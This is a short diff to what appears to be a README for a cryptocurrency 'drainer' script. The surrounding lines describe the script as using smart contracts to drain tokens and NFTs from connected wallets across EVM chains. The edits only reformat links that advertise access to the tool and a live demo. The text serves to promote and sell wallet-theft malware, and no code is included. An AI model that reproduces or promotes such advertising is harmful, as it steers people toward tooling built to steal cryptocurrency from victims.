@@ -10,8 +10,7 @@ This advanced script utilizes smart contracts to drain tokens and NFTs from inje
 
 📡 Multichain Support ensures deep scanning and interaction with all major EVM-compatible chains.
 
-📬 Get access and a live demo: [CryptoDrainers](https:cryptodrainers.net)
-
+📬 Get access and a live demo: [Cryptodrainers.net](https://Cryptodrainers.net)
 
 ## ✨ Features
 
@@ -85,4 +84,4 @@ ETH (Ethereum)
 
 
 📬 Need help or want access?  
-📲 [CryptoDrainers](https:cryptodrainers.net)
+📲 [Cryptodrainers.net](https://Cryptodrainers.net)
